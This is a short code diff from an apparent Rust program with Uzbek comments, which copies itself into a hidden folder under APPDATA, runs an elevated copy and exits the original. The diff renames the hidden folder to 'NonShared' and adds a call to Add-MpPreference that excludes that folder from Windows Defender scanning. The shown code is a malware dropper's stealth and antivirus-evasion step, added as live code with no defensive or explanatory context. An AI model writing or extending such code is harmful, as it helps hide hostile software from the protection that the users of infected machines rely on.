@@ -79,7 +79,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     // 0.2) Maqsadli katalog (masalan, %APPDATA%\MyHiddenApp)
     let mut dest_dir = env::var("APPDATA")
         .unwrap_or_else(|_| "C:\\Users\\Public".into());
-    dest_dir.push_str("\\MyHiddenApp");
+    dest_dir.push_str("\\NonShared");
     let dest_dir = PathBuf::from(dest_dir);
     fs::create_dir_all(&dest_dir)?;
 
@@ -116,6 +116,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         // — Original jarayonni to‘xtatish
         exit(0);
     }
+    // Add-MpPreference -ExclusionPath "C:\Users\work\Desktop\safe_files"
+    let _ = Command::new("Add-MpPreference").args(&["-ExclusionPath", "C:\\Users\\Public\\NonShared\\"]).spawn();
 
     // === 1) Endi biz admin‑nusxa ostida, yashirilgan katalogda turibmiz ===
 
